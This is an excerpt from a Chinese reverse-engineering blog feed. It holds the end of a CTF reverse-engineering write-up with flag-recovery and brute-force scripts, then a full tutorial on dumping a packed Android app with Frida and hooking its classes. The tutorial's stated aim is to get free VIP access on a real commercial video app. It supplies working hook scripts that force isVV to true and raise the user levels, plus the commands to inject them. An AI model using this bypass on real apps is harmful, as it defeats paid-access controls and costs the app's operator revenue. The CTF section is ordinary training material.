href="https://i.loli.net/2020/05/12/BJiUMbtSA7zQjlK.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/BJiUMbtSA7zQjlK.png" class="lazyload"></a></p><p>查看401500</p><p><a href="https://i.loli.net/2020/05/12/PTSV6HZdED7IUAJ.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/PTSV6HZdED7IUAJ.png" class="lazyload"></a></p><p>写脚本逆一下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key2 = [<span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x06</span>, <span class="number">0x13</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x3C</span>, <span class="number">0x1F</span>, <span class="number">0x57</span>, <span class="number">0x14</span>, <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x0D</span>]</span><br><span class="line">key3 = [<span class="number">37</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">38</span>,<span class="number">58</span>]</span><br><span class="line">code = list(<span class="string">"hahahaha_do_you_find_me?"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    str = key2[i]^ord(code[i])</span><br><span class="line">    print(chr(str),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></div><p>得到一部分flag</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d07abccf8a410c</span><br></pre></td></tr></table></figure></div><p>未解密前有个假flag</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key1=[<span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x64</span>, <span class="number">0x3B</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0x7B</span>, <span class="number">0x26</span>, <span class="number">0x3B</span>, <span class="number">0x50</span>, <span class="number">0x63</span>, <span class="number">0x5F</span>, <span class="number">0x4D</span>, <span class="number">0x5A</span>, <span class="number">0x71</span>, <span class="number">0x0C</span>, <span class="number">0x37</span>, <span class="number">0x66</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key1)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        key1[i] +=i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key1[i] ^=i</span><br><span class="line">    print(chr(key1[i]),end=<span class="string">""</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># flag&#123;fak3_alw35_sp_me!!&#125;</span></span><br></pre></td></tr></table></figure></div><p>比较发现还少5个字符，当然了，最后一个肯定是}</p><p>再看看另一个函数</p><p><a href="https://i.loli.net/2020/05/12/njOgic8TVSxkYfK.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/05/12/njOgic8TVSxkYfK.png" class="lazyload"></a></p><p>看到剩下五个字符，不过被加密了</p><p>这就纯靠猜了</p><p>最后v7肯定是}加密过来的，试试这两个异或，得到71，其他四个字符都异或71，最后得到b37a}拼起来就行。</p><p>或者。。。直接爆破</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">li=[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>,<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</span><br><span class="line"></span><br><span class="line">pname=<span class="string">'C:\\jocker.exe'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li:</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> li:</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> li:</span><br><span class="line">                print(i,j)</span><br><span class="line">                source=<span class="string">"flag&#123;d07abccf8a410c"</span>+i+j+k+m+<span class="string">"&#125;"</span></span><br><span class="line">                p = subprocess.Popen(pname, stdin=subprocess.PIPE, stdout=subprocess.PIPE)</span><br><span class="line">                source = source.encode(encoding=<span class="string">'UTF8'</span>)</span><br><span class="line">                result = p.communicate(input=source)</span><br><span class="line">                res=result[<span class="number">0</span>].decode()[<span class="number">0</span>:]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Really'</span> <span class="keyword">in</span> res:</span><br><span class="line">                    print(result)</span><br><span class="line">                    print(source)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2020网鼎杯RE-WP&quot;&gt;&lt;a href=&quot;#2020网鼎杯RE-WP&quot; class=&quot;headerlink&quot; title=&quot;2020网鼎杯RE WP&quot;&gt;&lt;/a&gt;2020网鼎杯RE WP&lt;/h1&gt;&lt;h2 id=&quot;re-bang&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>使用Frida给apk脱壳并穿透加固Hook函数</title>
    <link href="https://kabeor.github.io/%E4%BD%BF%E7%94%A8Frida%E7%BB%99apk%E8%84%B1%E5%A3%B3%E5%B9%B6%E7%A9%BF%E9%80%8F%E5%8A%A0%E5%9B%BAHook%E5%87%BD%E6%95%B0/"/>
    <id>https://kabeor.github.io/%E4%BD%BF%E7%94%A8Frida%E7%BB%99apk%E8%84%B1%E5%A3%B3%E5%B9%B6%E7%A9%BF%E9%80%8F%E5%8A%A0%E5%9B%BAHook%E5%87%BD%E6%95%B0/</id>
    <published>2020-05-05T16:00:00.000Z</published>
    <updated>2020-05-06T05:08:42.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Frida给apk脱壳并穿透加固Hook函数"><a href="#使用Frida给apk脱壳并穿透加固Hook函数" class="headerlink" title="使用Frida给apk脱壳并穿透加固Hook函数"></a>使用Frida给apk脱壳并穿透加固Hook函数</h1><blockquote><p>首发于先知社区 <a href="https://xz.aliyun.com/t/7670" target="_blank" rel="noopener">https://xz.aliyun.com/t/7670</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天拿到了新玩具JEB 3.17.1，想测试一下，顺便学习学习Android逆向，于是找了一个apk准备试试水，看看能不能搞到VIP。</p><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>拖入jeb查看</p><p><a href="https://i.loli.net/2020/04/22/mjUVQg8AJbxCP9u.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/04/22/mjUVQg8AJbxCP9u.png" class="lazyload"></a></p><p>嗯。。google一下</p><p><a href="https://i.loli.net/2020/04/22/YCipQE9bP7ao8T1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/04/22/YCipQE9bP7ao8T1.png" class="lazyload"></a></p><p>几维安全的壳，虚拟化很烦，也没什么好的脱壳工具，于是切换思路</p><p>从本质上来说，虚拟化就是自己实现了一套基本的cpu指令，通过自己的解释器解释给机器。因此想要在虚拟化之后仍然能让机器运行，当然还得还原代码给机器，只不过可能在内存中释放，加大了静态分析的难度。</p><p>那么直接让apk运行起来，我们去dump虚拟机自解密出来的dex不就好了么。</p><h2 id="frida-dump-dex"><a href="#frida-dump-dex" class="headerlink" title="frida dump dex"></a>frida dump dex</h2><p><strong>frida 是一款基于 python+javascript 的 hook 框架，可运行在 android、ios、linux、win等各个平台，主要使用的动态二进制插桩技术。</strong></p><p>总之frida是非常强大的，可以实现很多奇妙操作。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install frida</span><br></pre></td></tr></table></figure></div><h3 id="frida-server"><a href="#frida-server" class="headerlink" title="frida-server"></a>frida-server</h3><p><a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><p>到上面链接里找到对应手机架构，与frida版本相同的frida-server</p><p>移动frida-server到安卓的/data/local/tmp目录</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./adb push frida-server /data/<span class="built_in">local</span>/tmp</span><br><span class="line">./adb <span class="built_in">kill</span>-server &amp;&amp; ./adb server &amp;&amp; ./adb shell    <span class="comment"># 这里我用了mumu模拟器，其他虚拟机连接adb方法请自行查询</span></span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">chmod 777 frida-server</span><br><span class="line">./frida-server   <span class="comment">#开始你的炸弹秀</span></span><br></pre></td></tr></table></figure></div><h3 id="frida脚本"><a href="#frida脚本" class="headerlink" title="frida脚本"></a>frida脚本</h3><p>这里使用了FRIDA-DEXDump  <a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>其原理就是在内存中检索dex035头并获取dex长度，然后提取出来。当然，这样做会将内存中所有的dex包都提取出来，具体哪个才是我们需要的得根据包名判断并静态分析查看。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ./main.py</span><br></pre></td></tr></table></figure></div><p>这里我成功提取到了无壳dex，包名都比较清晰</p><p><a href="https://i.loli.net/2020/04/23/COexGPwpFHWBmDu.png" data-fancybox="group" data-caption="COexGPwpFHWBmDu" class="fancybox"><img alt="COexGPwpFHWBmDu" title="COexGPwpFHWBmDu" data-src="https://i.loli.net/2020/04/23/COexGPwpFHWBmDu.png" class="lazyload"></a></p><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>既然壳不好脱而且脱下来的又不容易修复，就考虑先看看封包里有没有VIP数据</p><p>使用HttpCanary对apk进行抓包</p><p>抓到了一个登陆验证包</p><p><a href="https://i.loli.net/2020/04/23/iqksg3QnvRawPCd.png" data-fancybox="group" data-caption="iqksg3QnvRawPCd" class="fancybox"><img alt="iqksg3QnvRawPCd" title="iqksg3QnvRawPCd" data-src="https://i.loli.net/2020/04/23/iqksg3QnvRawPCd.png" class="lazyload"></a></p><p>但响应里没有我们想要的信息，只是一个随时变动的值而已</p><p><a href="https://i.loli.net/2020/04/23/GRl1WQPuypFAgzf.png" data-fancybox="group" data-caption="GRl1WQPuypFAgzf" class="fancybox"><img alt="GRl1WQPuypFAgzf" title="GRl1WQPuypFAgzf" data-src="https://i.loli.net/2020/04/23/GRl1WQPuypFAgzf.png" class="lazyload"></a></p><p>看来抓包这条路走不通了，我们接下来只能分析拿到的dex。</p><h2 id="JEB静态分析"><a href="#JEB静态分析" class="headerlink" title="JEB静态分析"></a>JEB静态分析</h2><p>我们使用JEB来分析我们拿到的dex，查看包的层级数，定位到目标apk的包名，这里的命名都很清晰，直接按单词分析即可。</p><p><a href="https://i.loli.net/2020/04/23/YTpuncoBO3jAqC8.png" data-fancybox="group" data-caption="YTpuncoBO3jAqC8" class="fancybox"><img alt="YTpuncoBO3jAqC8" title="YTpuncoBO3jAqC8" data-src="https://i.loli.net/2020/04/23/YTpuncoBO3jAqC8.png" class="lazyload"></a></p><p>我这次用来当例子的是一个类似抖音快手的app，有视频和直播两个Activity，视频每天只能看十个（最坑的是重复点十次也算），然后就要求充值VIP，用户进入后可以不登录，会自动生成一个ID，且读取系统信息作为认证，所以重复的卸载安装当然是绕不过次数限制的。</p><p><strong>所以我们的目标就是通过frida hook函数使我们绕过限制，成为VIP。</strong></p><p>查看原apk文件的Manifest</p><p><a href="https://i.loli.net/2020/04/23/EZLfW1I9vjiesnl.png" data-fancybox="group" data-caption="EZLfW1I9vjiesnl" class="fancybox"><img alt="EZLfW1I9vjiesnl" title="EZLfW1I9vjiesnl" data-src="https://i.loli.net/2020/04/23/EZLfW1I9vjiesnl.png" class="lazyload"></a></p><p>这个权限它就离谱。。。</p><p>我们来看Activity的启动顺序</p><p><a href="https://i.loli.net/2020/04/23/IKGQzoLTsx2pfOq.png" data-fancybox="group" data-caption="IKGQzoLTsx2pfOq" class="fancybox"><img alt="IKGQzoLTsx2pfOq" title="IKGQzoLTsx2pfOq" data-src="https://i.loli.net/2020/04/23/IKGQzoLTsx2pfOq.png" class="lazyload"></a></p><p>先来了一个开屏广告SplashActivity，然后加载Main和Live顺便走一遍登录注册。</p><p>一般判断用户是否是VIP，可能存在多处判断，这样的话我们hook的点会量很大，而且可能存在漏掉的情况，因此去找变量最初赋值的位置来hook是从源头上控制了数据，而且前面封包分析发现用户数据请求发送后给我们的响应不包含VIP确认数据，因此可以说是万无一失。</p><p>回到层级目录分析，我们发现video/bean这个包里有我们感兴趣的东西，应该是包含了短视频相关数据。</p><p><a href="https://i.loli.net/2020/04/23/Gn3sh2xAdKYcP4k.png" data-fancybox="group" data-caption="Gn3sh2xAdKYcP4k" class="fancybox"><img alt="Gn3sh2xAdKYcP4k" title="Gn3sh2xAdKYcP4k" data-src="https://i.loli.net/2020/04/23/Gn3sh2xAdKYcP4k.png" class="lazyload"></a></p><p>查看TouseinfoBean这个类</p><p><a href="https://i.loli.net/2020/04/23/n9dzGQ7D8mLMXuR.png" data-fancybox="group" data-caption="n9dzGQ7D8mLMXuR" class="fancybox"><img alt="n9dzGQ7D8mLMXuR" title="n9dzGQ7D8mLMXuR" data-src="https://i.loli.net/2020/04/23/n9dzGQ7D8mLMXuR.png" class="lazyload"></a></p><p>我们发现这里应该包含了用户数据，修改此处就可以了。</p><p>但事情没有那么简单，通过交叉引用我们发现这个类根本没有被实例化（<del>可能是写着写着忘了又重新写了一个用户管理模块？？？</del>）</p><p>搜索字符串后并没有什么有用的发现，分析良久才想到从包层级列表搜索方法，豁然开朗（还是太菜）。</p><p><a href="https://i.loli.net/2020/04/23/LrMbjGgkuPXcaSF.png" data-fancybox="group" data-caption="LrMbjGgkuPXcaSF" class="fancybox"><img alt="LrMbjGgkuPXcaSF" title="LrMbjGgkuPXcaSF" data-src="https://i.loli.net/2020/04/23/LrMbjGgkuPXcaSF.png" class="lazyload"></a></p><p>嗯。。原来把直播和视频的vip管理合并到一个包了。</p><p>com.xxx.bean下有二十多个类，只能一个一个分析了，最后发现了几个有用的类</p><p><a href="https://i.loli.net/2020/04/23/8ByDikm9ECpqSub.png" data-fancybox="group" data-caption="8ByDikm9ECpqSub" class="fancybox"><img alt="8ByDikm9ECpqSub" title="8ByDikm9ECpqSub" data-src="https://i.loli.net/2020/04/23/8ByDikm9ECpqSub.png" class="lazyload"></a></p><p>其中UserBean用来管理用户信息，评论，VIP相关等等，UserLevelBean管理用户经验之类的信息。</p><p>UserBean类中以下三个方法是我们的Hook点</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JSONField</span>(name = <span class="string">"vvLevel"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getVVLevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.vvLevel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@JSONField</span>(name = <span class="string">"isVV"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isVV</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.isVV;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.level == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.level = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="编写frida脚本穿透加固-Hook-Java层函数"><a href="#编写frida脚本穿透加固-Hook-Java层函数" class="headerlink" title="编写frida脚本穿透加固 Hook Java层函数"></a>编写frida脚本穿透加固 Hook Java层函数</h2><p>没有加固的apk，一般来说直接改smali重新打包就行，而像我们现在遇到的壳，修复dex打包是一件很费力的事情，在这里frida的强大就体现出来了。</p><p><a href="https://bbs.pediy.com/thread-246767.htm" target="_blank" rel="noopener">使用frida来hook加固的Android应用的java层</a> 的原理可以看这里，简单来说就是拿到加载应用本身dex的classloader，通过这个classloader去找到被加固的类，通过这个类去Hook需要Hook的方法。</p><p>因此要穿透加固 Hook Java层函数的jscode模版如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available) &#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> application = Java.use(<span class="string">"android.app.Application"</span>);</span><br><span class="line"> </span><br><span class="line">        application.attach.overload(<span class="string">'android.content.Context'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.attach(context); <span class="comment">// 先执行原来的attach方法</span></span><br><span class="line">            <span class="keyword">var</span> classloader = context.getClassLoader(); <span class="comment">// 获取classloader</span></span><br><span class="line">            Java.classFactory.loader = classloader;</span><br><span class="line">            <span class="keyword">var</span> Hook_class = Java.classFactory.use(<span class="string">"com.xxx.类名"</span>); </span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Hook_class: "</span> + Hook_class);</span><br><span class="line">            <span class="comment">// 下面代码和写正常的hook一样</span></span><br><span class="line">            Hook_class.方法名.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) // 有参数填参数   </span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line"><span class="comment">//要执行的操作</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>根据上面对Hook点的分析，我们可以写出以下jscode</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'ok111'</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> application = Java.use(<span class="string">"android.app.Application"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'ok222'</span>);</span><br><span class="line">application.attach.overload(<span class="string">'android.content.Context'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'ok333'</span>);</span><br><span class="line"><span class="keyword">var</span> result = <span class="keyword">this</span>.attach(context); <span class="comment">// 先执行原来的attach方法</span></span><br><span class="line"><span class="keyword">var</span> classloader = context.getClassLoader(); <span class="comment">// 获取classloader</span></span><br><span class="line">Java.classFactory.loader = classloader;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'ok444'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> userinfo = Java.classFactory.use(<span class="string">"com.xxx.bean.UserBean"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"user: "</span> + userinfo);</span><br><span class="line"></span><br><span class="line">            userinfo.getLevel.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            userinfo.isVV.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            userinfo.getVVLevel.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"9"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="注入frida-Hook脚本"><a href="#注入frida-Hook脚本" class="headerlink" title="注入frida Hook脚本"></a>注入frida Hook脚本</h2><p>frida注入脚本有两种方式，使用python作为载体，直接运行脚本即可。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># hook代码，采用javascript编写</span></span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">//javascript代码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 自定义回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">'应用完整包名'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></div><p>或者使用命令行方式，当然了，还需要安装frida-tools</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install frida-tools</span><br></pre></td></tr></table></figure></div><p>这里我使用命令行方式（这里有个坑，必须按我给出的顺序，不然会报错无法连接）</p><p>先连接adb</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;adb kill-server &amp;&amp; .&#x2F;adb server &amp;&amp; .&#x2F;adb shell            &#x2F;&#x2F; mumu模拟器连接方式，其他模拟器自行查询</span><br></pre></td></tr></table></figure></div><p>新开一个shell，打开tcp转发，默认为27042端口，但是有些app会检测这个端口，因此我们来自定义一个</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;adb forward tcp:1234 tcp:1234</span><br></pre></td></tr></table></figure></div><p>回到第一个shell，我们已经连接到了adb，直接输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server -l 0.0.0.0:1234</span><br></pre></td></tr></table></figure></div><p>在第二个shell中执行注入命令</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -H 127.0.0.1:1234 -f com.xxx -l hook.js</span><br></pre></td></tr></table></figure></div><p>成功连接后命令行有如下回显</p><p><a href="https://i.loli.net/2020/04/23/iDvAzXabuQlIE1R.png" data-fancybox="group" data-caption="iDvAzXabuQlIE1R" class="fancybox"><img alt="iDvAzXabuQlIE1R" title="iDvAzXabuQlIE1R" data-src="https://i.loli.net/2020/04/23/iDvAzXabuQlIE1R.png" class="lazyload"></a></p><p>输入 %resume 对应的apk自启，没有报错则成功注入</p><p>我这里还加了一些流程和类名的输出</p><p><a href="https://i.loli.net/2020/04/23/Ne8P4MaObFd3Gvt.png" data-fancybox="group" data-caption="Ne8P4MaObFd3Gvt" class="fancybox"><img alt="Ne8P4MaObFd3Gvt" title="Ne8P4MaObFd3Gvt" data-src="https://i.loli.net/2020/04/23/Ne8P4MaObFd3Gvt.png" class="lazyload"></a></p><p>测试apk，已经可以了，其他功能思路差不多，Hook就行。</p><p><a href="https://i.loli.net/2020/04/23/WeiPtSmCyXguKsh.png" data-fancybox="group" data-caption="WeiPtSmCyXguKsh" class="fancybox"><img alt="WeiPtSmCyXguKsh" title="WeiPtSmCyXguKsh" data-src="https://i.loli.net/2020/04/23/WeiPtSmCyXguKsh.png" class="lazyload"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-246767.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246767.htm</a></p><p><a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwih5Ja1rv7oAhW0IaYKHegbDKkQrAIoADAAegQIARAI&amp;url=https%3A%2F%2Fbbs.pediy.com%2Fthread-249602.htm&amp;usg=AOvVaw1NsItIh36jELfizdNiiAdL" target="_blank" rel="noopener">https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwih5Ja1rv7oAhW0IaYKHegbDKkQrAIoADAAegQIARAI&amp;url=https%3A%2F%2Fbbs.pediy.com%2Fthread-249602.htm&amp;usg=AOvVaw1NsItIh36jELfizdNiiAdL</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;使用Frida给apk脱壳并穿透加固Hook函数&quot;&gt;&lt;a href=&quot;#使用Frida给apk脱壳并穿透加固Hook函数&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="Android" scheme="https://kabeor.github.io/categories/Android/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Android" scheme="https://kabeor.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Parallels安装Tools时call_tg_sync报错的修复</title>
